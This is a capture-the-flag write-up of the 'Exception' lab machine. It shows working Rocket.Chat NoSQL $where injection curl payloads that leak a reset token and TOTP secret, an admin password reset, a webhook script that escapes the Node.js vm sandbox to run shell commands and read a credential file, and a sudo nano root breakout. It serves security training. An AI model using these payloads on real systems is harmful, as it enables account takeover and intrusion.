---
layout: single
title: 'Exception Writeup - Hack Smarter'
collection: writeups
author_profile: true
date: 2026-01-01
permalink: /writeups/exception/
tags: [HackSmarter, Medium, Linux, API, JS, Sudo,]
---

## Overview

This write-up covers Exception, a medium level, standalone Linux machine from HackSmarter. Exception is a pretty technical machine that provides great practice for manual web application assesment, API abuse and chaining vulnerabilities together. If you get stuck or have any questions while working through it, don't hesitate to send me an email.
[https://www.hacksmarter.org/courses/df65d37c-ed63-4eca-8f78-5dede200ec8e](https://www.hacksmarter.org/courses/df65d37c-ed63-4eca-8f78-5dede200ec8e)


<div style="margin: 2rem 0;"></div>

## Enumeration

<div style="margin: 1rem 0;"></div>
The attacker starts by using nmap to check available services.




```bash 

  sudo nmap -sC -sV  -p- $IP --open
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-02 15:49 EDT
 Nmap scan report for 10.1.27.17
 Host is up (0.0085s latency).
 Not shown: 65532 closed tcp ports (reset)
 PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 |   256 b9:7c:3a:db:22:76:47:d9:29:af:da:cd:0d:1b:22:d5 (ECDSA)
 |_  256 45:65:36:61:8d:79:c3:dc:f7:a1:71:37:7d:f1:a1:cf (ED25519)
 80/tcp   open  http    Apache httpd 2.4.58 ((Ubuntu))
 |_http-server-header: Apache/2.4.58 (Ubuntu)
 |_http-title: Exception
 3000/tcp open  ppp?

```
<div style="margin: 2rem 0;"></div>
Seeing port 80 is available, the attacker manually enumerates the site and sees a Help bot with a chat window. 
![HTTP](/images/exception/excep_httpai.png)

<div style="margin: 2rem 0;"></div>
The attacker enumerates further and checks the source code, seeing that the chatbot relies entirely on a hardcoded list of pre-written strings. Which makes this likely a dead end. 
```js

 const chatBox = document.getElementById("chat-box");
    const input = document.getElementById("user-input");

    const responses = [
      { keywords: ["hi", "hello"], reply: "Hey there! How are you doing?" },
      { keywords: ["bye", "goodbye"], reply: "See you later! Take care!" },
      { keywords: ["help"], reply: "Sure! What do you need help with?" },
      { keywords: ["name"], reply: "I'm Chatty, your friendly chatbot." },
      { keywords: ["weather"], reply: "I'm not sure, but it looks sunny to me!" },
      { keywords: ["time"], reply: "It's " + new Date().toLocaleTimeString() + " right now!" },
      { keywords: ["joke"], reply: "Why don’t skeletons fight each other? They don’t have the guts!" },
      { keywords: ["age"], reply: "I'm timeless — I was born in code!" },
      { keywords: ["love"], reply: "Aww, I love chatting with you too 💙" },
      { keywords: ["food"], reply: "Pizza sounds great right now, don’t you think?" }
    ];

    const fallback = [
      "Hmm, I’m not sure I understand.",
      "Can you tell me more?",
      "That’s interesting!",
      "Let's talk about something fun!"
    ];

    function sendMessage() {
      const userText = input.value.trim();
      if (!userText) return;

      addMessage(userText, "user");
      input.value = "";

      // Find a matching reply
      const lowerText = userText.toLowerCase();
      let reply = null;
      for (const r of responses) {
        if (r.keywords.some(k => lowerText.includes(k))) {
          reply = r.reply;
          break;
        }
      }

      // Use random fallback if no match
      if (!reply) reply = fallback[Math.floor(Math.random() * fallback.length)];

      setTimeout(() => addMessage(reply, "bot"), 500);
    }

    function addMessage(text, sender) {
      const msg = document.createElement("div");
      msg.classList.add("message", sender);
      msg.textContent = text;
      chatBox.appendChild(msg);
      chatBox.scrollTop = chatBox.scrollHeight;
    }

    input.addEventListener("keypress", e => {
      if (e.key === "Enter") sendMessage();
    });
    
```

<div style="margin: 2rem 0;"></div>

The Attacker then starts manually enumerating Port 3000. Noting the login page and registering a new account.
![login](/images/exception/excep_login.png)

<div style="margin: 2rem 0;"></div>

Upon registering an account, the attacker sees a message from the admin, containing an email address. The attacker notes the email and username. 
![rocket](/images/exception/excep_rocketchat.png)

<div style="margin: 2rem 0;"></div>

Researching Rocket chat, the attacker finds [https://www.exploit-db.com/exploits/50108](https://www.exploit-db.com/exploits/50108) showcasing a potential attack vector. Analyzing the exploit script showed that it required an Administrator email address to execute, which the attacker has already found exposed in the general chat.
![CVE](/images/exception/excep_CVE.png)

<div style="margin: 2rem 0;"></div>

## Exploitation 

<div style="margin: 1rem 0;"></div>

The exploit script attempts to brute-force the admin's password reset token, but returned an error after running for over 10 minutes.
```bash

 python 50108.py -u 123@123.com -a localh0ste@exception.local -t http://10.1.27.17:3000
 [+] Resetting 123@123.com password
 [+] Password Reset Email Sent
 Got: q
 Got: qf
 Got: qfn
 Got: qfn6
 Got: qfn6y
 Got: qfn6yf
 Got: qfn6yfB
 Got: qfn6yfBe
 Got: qfn6yfBet
 Got: qfn6yfBetd
 Got: qfn6yfBetdm
 Got: qfn6yfBetdmt
 Got: qfn6yfBetdmtV
 Got: qfn6yfBetdmtVe
 Got: qfn6yfBetdmtVe0
 Got: qfn6yfBetdmtVe0y
 Got: qfn6yfBetdmtVe0yJ
 Got: qfn6yfBetdmtVe0yJm
 Got: qfn6yfBetdmtVe0yJmy
 Got: qfn6yfBetdmtVe0yJmyY
 Got: qfn6yfBetdmtVe0yJmyYE
 Got: qfn6yfBetdmtVe0yJmyYEu
 Got: qfn6yfBetdmtVe0yJmyYEuE
 Got: qfn6yfBetdmtVe0yJmyYEuEw
 Got: qfn6yfBetdmtVe0yJmyYEuEw0
 Got: qfn6yfBetdmtVe0yJmyYEuEw0A
 Got: qfn6yfBetdmtVe0yJmyYEuEw0AL
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALb
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbn
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnH
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHu
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuw
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwU
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUb
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbL
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLf
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfj
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjT
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjTq
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjTqf
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjTqfO
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjTqfOn
 Got: qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjTqfOnB
 [+] Got token : qfn6yfBetdmtVe0yJmyYEuEw0ALbnHuwUbLfjTqfOnB
 [-] Wrong token

```

<div style="margin: 2rem 0;"></div>

Expanding his search and researching the vulnerability further, the attacker uncovers a detailed analysis of Rocket. Chat's NoSQL vulnerabilities [https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat](https://www.sonarsource.com/blog/nosql-injections-in-rocket-chat). He then pivots to manual exploitation, opting to interact directly with the API.

Now the attacker begins constructing a curl command. To obtain the necessary credentials, he uses the browser's 'Inspect Element' feature to open the Developer Tools and navigates to the Application (or Storage) tab. There, he extracted the rc_token and rc_uid directly from Local Storage. With these persistent session identifiers, the attacker could then build a curl request to target the Rocket.Chat API from the command line.
![cookies](/images/exception/excep_cookies.png)

<div style="margin: 2rem 0;"></div>

With these authentication headers, the attacker prepares to exploit the NoSQL vulnerability. However, to ensure an active password reset token is in the database, he first must manually triggered a password request for the victim on the login page.
![reset](/images/exception/except_resetpass.png)

<div style="margin: 2rem 0;"></div>

The attacker then used the two curls commands against the /api/v1/users.list endpoint to target the newly generated token and the 2FA secret. By injecting the `$where` operator, he forced deliberate server-side errors to iteratively leak data from the backend. The first payload successfully extracted the live password reset token, while the second retrieved the target's TOTP secret.

```bash

 curl -G "http://10.0.29.57:3000/api/v1/users.list" \
      -H "X-Auth-Token: xfx0Uh0xsOXjdZcD1q0CVhGRLTn2z82Xp8v-Wc5o1wB" \
      -H "X-User-Id: yQuYq5gWFCCq3axXP" \
      --data-urlencode 'query={"$where":"this.username===\u0027localh0ste\u0027 && (() =>{ throw this.services.password.reset.token })()"}'
 {"success":false,"error":"uncaught exception: c-HUtnlAI_G-YXZy2KpfKe--ErFOaq5C2bnYrSlKD1G"}      
     
```

<div style="margin: 1rem 0;"></div>

```bash

 curl -G "http://10.0.29.57:3000/api/v1/users.list" \
      -H "X-Auth-Token: xfx0Uh0xsOXjdZcD1q0CVhGRLTn2z82Xp8v-Wc5o1wB" \
      -H "X-User-Id: yQuYq5gWFCCq3axXP" \
      --data-urlencode 'query={"$where":"this.username===\u0027localh0ste\u0027 && (() =>{ throw this.services.totp.secret })()"}'
 {"success":false,"error":"uncaught exception: KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ"}  

```
 
 <div style="margin: 2rem 0;"></div>
  
Equipped with the target's TOTP secret, the attacker uses the command-line utility oathtool to generate a valid time-based one-time password and prepares to reset the administrator pass. 

```bash

 oathtool "KIYTUQZKO4YD6ZJYEUWFAMB4OBAU6I3RJBCXMP3UGJHEOOBJGNLQ" 
 630062

```

 <div style="margin: 2rem 0;"></div>
 
Once the attacker has a valid TOTP, everything is in place to use a curl command and reset the administrator pass. However, timing is critical during this step: the generated TOTP code rotates every 30 seconds, and the backend password reset token also carries an expiration window. If the execution is delayed, the request will fail with a 403 error and the entire process must be restarted.

```bash

  curl -X POST "http://10.0.29.57:3000/api/v1/method.callAnon/resetPassword" \
      -H "Content-Type: application/json" \
      -d '{"message": "{\"msg\":\"method\",\"id\":\"1\",\"method\":\"resetPassword\",\"params\":[\"FeRuGgoUpBqlEY2gMbAM6ih0LCq-mRd5JOjyHKlZVV2\",\"Password123!\",{\"twoFactorCode\":\"555878\",\"twoFactorMethod\":\"totp\"}]}"}'

```
 <div style="margin: 2rem 0;"></div>
 
Testing the credentials, the attacker logs in and gets a 2FA alert using the oathtool command from earlier. The attacker generates a new TOTP and logs in. 
![2FA](/images/exception/except_2FA.png)

<div style="margin: 1rem 0;"></div>
![HTTP](/images/exception/excep_admin_login.png)

With full administrative access secured, the attacker shifts focus to achieving Remote Code Execution (RCE) on the underlying system. Drawing on the techniques detailed in the SonarSource analysis, the attacker targets Rocket.Chat's "Webhook Integrations" feature.

This feature allows administrators to execute custom JavaScript for incoming webhooks within a Node.js vm environment. However, the vm module is not a strict security sandbox and can be bypassed.

Navigating to Administration > Workspace > Integrations, the attacker creates a new "Incoming Webhook" and toggles the Script Enabled option to true. In the script window, He injected a malicious Node.js payload designed to escape the restricted VM context. By using console.log.constructor to access the parent context, the attacker successfully imported the child_process module to execute system commands.
![webhook](/images/exception/excep_webhookadmin.png)

 <div style="margin: 2rem 0;"></div>
 
Despite multiple attempts with various payloads, the attacker was unable to establish a reverse shell. Adapting to the restricted environment, he pivots to using the webhook to execute local commands and return the output directly within the chat window. Because the payload only runs when the webhook receives an incoming request, the attacker uses a curl command to trigger the execution and view the output. Using this method to enumerate the underlying file system, the attacker listed the contents of the root directory (/). This enumeration revealed a sensitive file containing credentials (Backup_db.txt). By updating the webhook payload to read this file and firing the curl command once more, the attacker successfully extracts hardcoded database credentials.

```js 

 class Script {
     process_incoming_request({ request }) {
         const require = console.log.constructor('return process.mainModule.require')();
         const { execSync } = require('child_process');
         const rce = execSync('ls /').toString();
         return {
             content: {
                 text: rce
             }
         };
     }
 }

```
<div style="margin: 1rem 0;"></div>

```js 

 class Script {
     process_incoming_request({ request }) {
         const require = console.log.constructor('return process.mainModule.require')();
         const { execSync } = require('child_process');
         const rce = execSync('cat /Backup_db.txt'').toString();
         return {
             content: {
                 text: rce
             }
         };
     }
 }

```

<div style="margin: 1rem 0;"></div>

![roncred](/images/exception/excep_roncred.png)

 <div style="margin: 2rem 0;"></div>
 
 Testing the extracted credentials for access, the attacker initiated an ssh connection to the target machine.
 
```bash 
 
 ssh Ron@$IP

```
 <div style="margin: 1rem 0;"></div>
 
 The authentication succeeded, securing a stable, terminal with user-level privileges.
 ![ronssh](/images/exception/excep_ron_ssh.png)
 
 <div style="margin: 2rem 0;"></div>
 
## Privilege Escalation
 
 <div style="margin: 1rem 0;"></div>
 
With a stable user session established, the attacker begains enumerating the system for local privilege escalation vectors. A standard check of the user's sudo permissions indicated that the user, Ron, could execute the custom check_log script as root without providing a password.
 
```bash

 Ron@Chatty:~$ sudo -l
 Matching Defaults entries for Ron on Chatty:
     env_reset, mail_badpass,
     secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
     use_pty

 User Ron may run the following commands on Chatty:
     (root) NOPASSWD: /opt/log_inspector/check_log --clean

```

 <div style="margin: 2rem 0;"></div>

The attacker began enumerating the command, after processing the logs the `check_log` script automatically opens a nano text editor interface. Crucially, because the original script was executed via sudo, this nano instance is running with full root privileges. This presents a classic application breakout opportunity.
Inside the nano editor, the attacker leveraged the built-in execute command function using the `^T` (Ctrl+T) shortcut. This allows the attacker to bypass the text interface, execute system commands with root privileges and read the root flag to complete the machine.
 ![ronnano](/images/exception/excep_ron_nano.png)
 
